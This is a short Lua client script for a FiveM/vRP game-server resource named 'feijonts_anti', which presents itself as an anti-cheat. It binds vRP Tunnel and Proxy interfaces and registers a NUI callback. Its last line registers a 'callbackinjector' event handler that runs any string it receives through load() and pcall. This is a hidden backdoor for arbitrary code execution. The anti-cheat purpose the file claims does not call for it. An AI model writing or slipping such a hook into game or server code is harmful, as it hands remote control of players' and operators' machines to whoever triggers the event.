local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")

src = {}
Tunnel.bindInterface("feijonts_anti",src)
Proxy.addInterface("feijonts_antii",src)
acClient = Tunnel.getInterface("feijonts_anti")

RegisterNUICallback("loadNuis", function(data, cb)
	acClient.pegaTrouxa()
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)